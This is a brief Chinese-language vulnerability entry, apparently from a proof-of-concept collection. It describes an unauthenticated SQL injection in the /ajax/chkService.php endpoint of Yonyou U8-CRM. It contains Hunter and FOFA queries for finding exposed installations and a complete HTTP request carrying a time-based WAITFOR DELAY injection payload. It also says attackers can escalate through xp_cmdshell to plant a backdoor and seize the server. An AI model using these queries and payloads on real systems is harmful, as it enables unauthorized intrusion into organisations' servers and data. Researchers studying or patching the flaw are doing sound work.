## 用友U8-CRM系统chkService.php存在SQL注入漏洞

用友U8-CRM系统 /ajax/chkService.php 文件存在SQL注入漏洞，未经身份验证的攻击者通过漏洞执行任意SQL语句，调用xp_cmdshell写入后门文件，执行任意代码，从而获取到服务器权限。

## hunter

```jade
app.name="用友 CRM"
```

## fofa

```jade
title="用友U8CRM"
```

## poc

```javascript
GET /ajax/chkService.php?Action=chkAccountNumExists&accountNum=1%27;WAITFOR+DELAY+%270:0:5%27-- HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:127.0) Gecko/20100101 Firefox/127.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Cookie: PHPSESSID=bgsesstimeout-;
Connection: close
```

